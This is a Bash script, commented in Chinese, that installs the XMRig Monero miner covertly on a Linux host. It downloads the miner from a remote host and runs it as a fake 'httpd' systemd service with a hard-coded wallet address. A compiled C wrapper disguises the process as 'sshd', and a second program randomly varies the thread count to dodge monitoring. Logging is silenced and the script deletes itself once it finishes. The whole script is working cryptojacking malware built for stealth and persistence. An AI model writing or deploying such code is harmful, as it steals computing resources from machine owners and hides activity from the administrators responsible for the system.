#!/bin/bash

# 隐藏 xmrig 进程及其特征的一键部署脚本（带C语言实现的随机线程调整）

# 确保脚本以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 检查依赖
for cmd in curl tar gcc systemctl; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请先安装" 1>&2
        exit 1
    fi
done

# 用户输入矿池信息
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入采矿服务器密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}

# 创建目录
mkdir -p /opt/xmrig /etc/systemd/conf.d || { echo "创建目录失败" 1>&2; exit 1; }

# 下载并安装 xmrig
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/xmrig || { echo "下载或解压失败" 1>&2; exit 1; }
mv /opt/xmrig/xmrig-6.22.2/xmrig /opt/xmrig/httpd || { echo "移动文件失败" 1>&2; exit 1; }
chmod +x /opt/xmrig/httpd
rm -rf /opt/xmrig/xmrig-6.22.2

# 创建 wrapper 以伪装进程名
cat > /opt/xmrig/wrapper.c <<EOF
#include <sys/prctl.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "sshd", 0, 0, 0);
    execv("/opt/xmrig/httpd", argv);
    return 0;
}
EOF
gcc -o /opt/xmrig/wrapper /opt/xmrig/wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
rm /opt/xmrig/wrapper.c

# 创建 C 语言实现的线程调整程序
cat > /opt/xmrig/adjust_threads.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/prctl.h>

int main() {
    // 设置进程名为 httpd-adjust
    prctl(PR_SET_NAME, "httpd-adjust", 0, 0, 0);
    
    // 初始化随机数种子
    srand(time(NULL));
    
    // 获取 CPU 核心数
    int max_threads = sysconf(_SC_NPROCESSORS_ONLN);
    if (max_threads <= 0) max_threads = 1;
    
    char command[256];
    const char *config_file = "/etc/systemd/conf.d/httpd.conf";
    
    while (1) {
        // 随机选择线程数（1到最大核心数之间）
        int threads = (rand() % max_threads) + 1;
        
        // 更新配置文件中的线程数
        snprintf(command, sizeof(command),
                "sed -i 's/\\\"threads\\\": [0-9]*/\\\"threads\\\": %d/' %s",
                threads, config_file);
        system(command);
        
        // 重启服务
        system("systemctl restart httpd.service");
        
        // 随机等待10-15分钟（600-900秒）
        int sleep_time = (rand() % 301) + 600;
        sleep(sleep_time);
    }
    
    return 0;
}
EOF
gcc -o /opt/xmrig/adjust_threads /opt/xmrig/adjust_threads.c || { echo "编译 adjust_threads 失败" 1>&2; exit 1; }
rm /opt/xmrig/adjust_threads.c
chmod +x /opt/xmrig/adjust_threads

# 生成初始配置文件（添加线程配置）
cat > /etc/systemd/conf.d/httpd.conf <<EOF
{
    "pools": [
        {
            "url": "$pool_url",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false,
    "threads": 1
}
EOF

# 创建用户和组
groupadd -r httpd 2>/dev/null || true
useradd -r -s /bin/false -g httpd httpd || { echo "创建用户失败" 1>&2; exit 1; }

# 创建 systemd 服务文件（挖矿服务）
cat > /etc/systemd/system/httpd.service <<EOF
[Unit]
Description=HTTP Server
After=network.target

[Service]
User=httpd
Group=httpd
ExecStart=/opt/xmrig/wrapper --config=/etc/systemd/conf.d/httpd.conf --no-color --log-file=/dev/null
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# 创建 systemd 服务文件（线程调整服务）
cat > /etc/systemd/system/httpd-adjust.service <<EOF
[Unit]
Description=HTTP Server Thread Adjuster
After=network.target httpd.service

[Service]
ExecStart=/opt/xmrig/adjust_threads
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# 启用并启动服务
systemctl daemon-reload
systemctl enable httpd.service
systemctl enable httpd-adjust.service
systemctl start httpd.service || { echo "挖矿服务启动失败" 1>&2; exit 1; }
systemctl start httpd-adjust.service || { echo "调整服务启动失败" 1>&2; exit 1; }

# 删除脚本自身
rm -- "$0"
echo "部署完成！线程将每10-15分钟随机调整"